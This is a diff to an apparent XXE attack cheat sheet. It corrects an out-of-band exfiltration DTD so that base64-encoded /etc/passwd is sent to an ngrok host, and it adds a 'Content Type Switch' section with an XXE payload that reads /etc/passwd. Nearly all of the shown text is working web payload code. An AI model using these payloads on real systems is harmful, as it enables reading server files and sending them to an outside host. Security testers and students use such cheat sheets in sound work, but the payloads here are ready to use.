@@ -68,7 +68,7 @@ evil.dtd
 
 ```dtd
 <!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
-<!ENTITY % paran1 "<!ENTITY exfil SYSTEM 'https://b99e-83-213-97-233.ngrok-free.app/?x=data;'>">
+<!ENTITY % paran1 "<!ENTITY exfil SYSTEM 'https://b99e-83-213-97-233.ngrok-free.app/?x=%data;'>">
 ```
 
 ```xml
@@ -88,4 +88,18 @@ evil.dtd
        <email>test@test.com</email>  
    </contact>  
 </contacts>
+```
+
+# Content Type Switch
+
+Content-Type: application/xml
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<root>
+    <search>
+        &xxe;
+    </search>
+</root>
 ```
